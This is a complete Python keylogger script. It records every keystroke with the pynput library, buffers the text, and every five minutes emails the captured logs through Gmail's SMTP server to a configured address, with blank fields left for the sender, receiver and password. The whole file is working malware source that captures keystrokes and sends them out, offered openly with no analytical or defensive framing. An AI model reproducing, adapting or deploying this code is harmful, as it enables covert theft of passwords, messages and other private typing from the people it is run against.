from pynput import keyboard
import smtplib,ssl
import threading
import time

sender_mail = ""     # Replace user@domain.com with your email id (everywhere)
#prefer using your own email id for receiver's as well.
receiver_mail = ""  # Replace user@domain.com with your email id (everywhere)
password = ""

port = 587              # TLS port
interval = 300          # Send every 300 seconds (5 minutes)

# === INITIALIZATION ===
log_buffer = []
stop_flag = False

# === KEYLOGGER LOGIC ===
def write_to_buffer(text):
    global log_buffer
    log_buffer.append(text)

def on_key_press(key):
    try:
        if key == keyboard.Key.enter:
            write_to_buffer("\n")
        else:
            write_to_buffer(key.char)
    except AttributeError:
        if key == keyboard.Key.backspace:
            write_to_buffer("\n[Backspace]\n")
        elif key == keyboard.Key.tab:
            write_to_buffer("\n[Tab]\n")
        elif key == keyboard.Key.space:
            write_to_buffer(" ")
        else:
            write_to_buffer(f"\n[{key}]")

def on_key_release(key):
    if key == keyboard.Key.esc:
        global stop_flag
        stop_flag = True
        return False

# === EMAIL SENDER ===
def send_email(logs):
    message = f"""From: {sender_mail}
To: {receiver_mail}
Subject: KeyLogs Update

Text: {logs}
"""
    try:
        context = ssl.create_default_context()
        server = smtplib.SMTP('smtp.gmail.com', port)
        server.starttls(context=context)
        server.login(sender_mail, password)
        server.sendmail(sender_mail, receiver_mail, message)
        server.quit()
        print("Email sent.")
    except Exception as e:
        print("Error sending email:", e)

# === TIMER FUNCTION ===
def report():
    global log_buffer, stop_flag
    if log_buffer:
        logs = ''.join(log_buffer)
        send_email(logs)
        log_buffer = []
    if not stop_flag:
        threading.Timer(interval, report).start()

# === START ===
print("[*] Keylogger Started. Press ESC to stop.")
report()

with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()




